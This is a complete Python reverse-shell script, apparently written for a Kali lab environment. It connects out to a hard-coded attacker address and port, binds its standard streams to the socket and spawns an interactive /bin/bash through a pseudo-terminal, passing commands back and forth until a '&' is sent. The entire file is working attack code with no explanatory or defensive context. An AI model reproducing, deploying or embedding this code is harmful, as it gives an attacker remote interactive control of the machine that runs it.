import socket
import os
import pty
import select

# change as needed to match Kali:
KALI_IP = '10.0.2.5'
PORT = 5555

conn =False

# Connect to kali
try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((KALI_IP, PORT))
        conn=True
        s.send('\n\nConnected! Enter \'&\' to exit shell\n\n'.encode())
except socket.error as e:
        conn=False

# Set up stdin, stdout, and stderr
try:
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
except OSError as e:
    s.close()

def shell():
        child_pid, master_fd = pty.fork()

        if child_pid ==0:
                os.execvp('/bin/bash',['/bin/bash','-i']) # opens the interactive shell
        else:

                while True:
                        try:

                                rlist,_,_ = select.select([s,master_fd],[],[],0.1)

                                if s in rlist:
                                        data = s.recv(1024).decode('utf-8')
                                        if data.strip()=='&': #close the shell if receive &
                                                break
                                        else:
                                                os.write(master_fd, data.encode())

                                if master_fd in rlist:
                                        output = os.read(master_fd,1024)
                                        s.send(output)


                        except KeyboardInterrupt as kb:
                                continue
                s.close()

if __name__=="__main__":
        # Run the interactive shell
        if conn:
                shell()
                
                
